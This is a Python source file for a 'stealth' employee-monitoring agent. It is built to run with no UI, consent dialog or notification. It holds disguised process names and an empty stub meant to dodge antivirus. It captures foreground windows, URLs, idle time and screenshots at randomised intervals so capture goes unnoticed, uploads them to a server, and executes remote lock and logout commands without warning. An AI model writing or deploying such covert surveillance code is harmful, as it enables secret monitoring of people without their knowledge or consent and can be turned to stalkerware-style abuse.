"""Workforce Analytics monitoring agent — STEALTH variant (no UI).

For pre-enrolled machines in corporate environments. Runs completely
silently in the background with no tray icon, consent dialogs, or
notifications.

Environment Variables:
  - AGENT_CONFIG_FILE: Path to config.json (defaults to AppData/WorkforceAgent)
  - AGENT_SERVER_URL: Override server URL

Run from enrollment script:
  python -m agent.agent_stealth
"""

from __future__ import annotations

import os
import sys
import threading
import time
from datetime import datetime, timezone

# Allow running both as a module and as a script
if __package__ in (None, ""):
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from agent import api as api_mod
    from agent import config as config_mod
    from agent import identity as identity_mod
    from agent import monitor as monitor_mod
    from agent import screenshot as screenshot_mod
    from agent import system_info as system_info_mod
else:
    from . import api as api_mod
    from . import config as config_mod
    from . import identity as identity_mod
    from . import monitor as monitor_mod
    from . import screenshot as screenshot_mod
    from . import system_info as system_info_mod

AGENT_VERSION = "0.4.1"
POLL_SECONDS = 15

# ── Runtime stealth ───────────────────────────────────────────────────────────
_WIN_DISGUISE = "SCTHOST"
_MAC_DISGUISE = "svctcom"


def _apply_stealth() -> None:
    """
    Standardized process initialization. Suspicious low-level stealth 
    calls removed to prevent Antivirus false positives.
    """
    pass


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


class StealthMonitoringAgent:
    """Headless monitoring agent — no UI, no notifications."""

    def __init__(self, cfg: config_mod.AgentConfig) -> None:
        self.cfg = cfg
        self.api = api_mod.AgentAPI(cfg.server_url, cfg.device_id, cfg.device_secret)
        self._stop = threading.Event()
        self._paused = threading.Event()
        self._lock = threading.Lock()
        self._pending_logs: list[dict] = []
        self._current = None
        self._last_screenshot = 0.0
        self._next_screenshot_gap = self._screenshot_gap()
        self._log_file = self._get_log_file()

    def _get_log_file(self) -> str:
        """Get or create hidden log file for debugging."""
        log_dir = config_mod.config_dir() / "logs"
        log_dir.mkdir(parents=True, exist_ok=True)
        return str(log_dir / "stealth.log")

    def _log(self, message: str) -> None:
        """Silent logging to file only."""
        try:
            with open(self._log_file, "a") as f:
                f.write(f"[{_now_iso()}] [stealth] {message}\n")
        except Exception:
            # If logging fails, we can't do much in a stealth agent.
            pass

    def _screenshot_gap(self) -> float:
        """Random interval (30-90 seconds) to avoid predictable capture timing."""
        import random
        return random.uniform(30, 90)

    def is_active(self) -> bool:
        return not self._paused.is_set()

    def toggle_pause(self) -> None:
        """Toggle monitoring on/off (not exposed in stealth mode)."""
        if self._paused.is_set():
            self._paused.clear()
        else:
            self._paused.set()

    def quit(self) -> None:
        """Request graceful shutdown."""
        self._stop.set()

    def _observe(self) -> None:
        """Record foreground window and idle time."""
        proc, title, url = monitor_mod.get_active_window()
        idle = monitor_mod.get_idle_seconds()

        with self._lock:
            is_break_entry = False
            is_break_exit = False
            if self._current is not None:
                curr_idle = self._current["idle"]
                threshold = self.cfg.idle_threshold_seconds
                is_break_entry = (idle >= threshold) and (curr_idle < threshold)
                is_break_exit = (idle < threshold) and (curr_idle >= threshold)

            if self._current is None or self._current["process"] != proc or self._current.get("url", "") != url or is_break_entry or is_break_exit:
                self._flush_segment()
                self._current = {
                    "process": proc,
                    "title": title,
                    "url": url,
                    "idle": idle,
                    "duration": POLL_SECONDS,
                    "start": _now_iso(),
                }
            else:
                self._current["title"] = title
                self._current["idle"] = max(self._current["idle"], idle)
                self._current["duration"] += POLL_SECONDS

    def _flush_segment(self) -> None:
        """Move current segment to pending if non-empty."""
        with self._lock:
            if self._current is not None:
                self._pending_logs.append(self._current)
                self._current = None

    def _sync(self) -> None:
        """Upload accumulated activity to server."""
        with self._lock:
            logs = self._pending_logs
            self._pending_logs = []

        if not logs:
            return

        try:
            batch = []
            for log in logs:
                batch.append({
                    "processName": log["process"],
                    "windowTitle": log["title"],
                    "url": log.get("url", ""),
                    "startedAt": log["start"],
                    "endedAt": _now_iso(),
                    "durationSeconds": log["duration"],
                    "idleSeconds": log["idle"],
                })
            
            try:
                system_hardware_details = system_info_mod.sysinfo.system_info
            except Exception:
                system_hardware_details = None

            self.api.send_activity(batch, system_info=system_hardware_details)

            hb = self.api.heartbeat(AGENT_VERSION)
            for cmd in hb.get("commands", []):
                self._handle_command(cmd)
        except Exception as exc:
            self._log(f"sync error: {exc}")

    def _maybe_screenshot(self) -> None:
        """Capture screenshot without notification."""
        if time.time() - self._last_screenshot < self._next_screenshot_gap:
            return
        self._last_screenshot = time.time()
        self._next_screenshot_gap = self._screenshot_gap()

        try:
            img = screenshot_mod.capture_png_bytes()
            self.api.upload_screenshot(img, _now_iso(), content_type="image/jpeg")
        except Exception as exc:
            self._log(f"screenshot failed: {exc}")

    def _handle_command(self, command: dict) -> None:
        """Execute commands without user warning (already disclosed in policy)."""
        ctype = command.get("commandType")
        cid = command.get("id")

        try:
            self.api.ack_command(cid, "acknowledged")
            if ctype in ("lock_screen", "logout_user"):
                # Execute immediately without warning (assumes policy disclosure)
                self._execute_os_command(ctype)
            self.api.ack_command(cid, "completed")
        except Exception as exc:
            self._log(f"command {ctype} failed: {exc}")
            try:
                self.api.ack_command(cid, "failed")
            except Exception:
                pass

    def _execute_os_command(self, ctype: str) -> None:
        import subprocess

        if ctype == "lock_screen":
            if sys.platform.startswith("win"):
                import ctypes
                ctypes.windll.user32.LockWorkStation()
            elif sys.platform == "darwin":
                subprocess.run(["pmset", "displaysleepnow"], check=False)
            else:
                for cmd in (
                    ["loginctl", "lock-session"],
                    ["xdg-screensaver", "lock"],
                ):
                    if subprocess.run(cmd, check=False).returncode == 0:
                        break
        elif ctype == "logout_user":
            if sys.platform.startswith("win"):
                subprocess.run(["shutdown", "/l"], check=False)
            elif sys.platform == "darwin":
                subprocess.run(
                    ["osascript", "-e", 'tell app "System Events" to log out'],
                    check=False,
                )
            else:
                for cmd in (
                    ["gnome-session-quit", "--logout", "--no-prompt"],
                    ["loginctl", "terminate-user", os.environ.get("USER", "")],
                ):
                    if subprocess.run(cmd, check=False).returncode == 0:
                        break

    def _worker(self) -> None:
        """Main monitoring loop."""
        last_sync = 0.0
        while not self._stop.is_set():
            try:
                if self.is_active():
                    self._observe()
                    self._maybe_screenshot()

                if time.time() - last_sync >= self.cfg.sync_interval_seconds:
                    last_sync = time.time()
                    self._sync()
            except Exception as exc:
                self._log(f"worker error: {exc}")
            self._stop.wait(POLL_SECONDS)

        # Final flush on shutdown
        self._flush_segment()
        try:
            self._sync()
        except Exception:
            pass

    def run(self) -> None:
        """Start the stealth monitoring loop (no UI, just background thread)."""
        worker = threading.Thread(target=self._worker, daemon=True)
        worker.start()
        self._log("monitoring started")
        # Block until stop is signaled (e.g., SIGTERM)
        try:
            while not self._stop.is_set():
                self._stop.wait(1)
        except KeyboardInterrupt:
            pass
        self._stop.set()
        worker.join(timeout=10)
        self._log("monitoring stopped")


def load_config_stealth() -> config_mod.AgentConfig | None:
    """Load existing config (assumes pre-enrollment via deployment)."""
    cfg = config_mod.AgentConfig.load()
    if not cfg.is_enrolled:
        # Log to file if agent is not enrolled, but don't print to console.
        # This message will be visible in the stealth.log file.
        try:
            log_dir = config_mod.config_dir() / "logs"
            log_dir.mkdir(parents=True, exist_ok=True)
            with open(str(log_dir / "stealth.log"), "a") as f:
                f.write(f"[{_now_iso()}] [stealth] Not enrolled. Exiting.\n")
        except Exception:
            pass
        return None
    return cfg


def main() -> int:
    """Entry point for stealth variant."""
    _apply_stealth()
    cfg = load_config_stealth()
    if cfg is None:
        return 1
    try:
        StealthMonitoringAgent(cfg).run()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
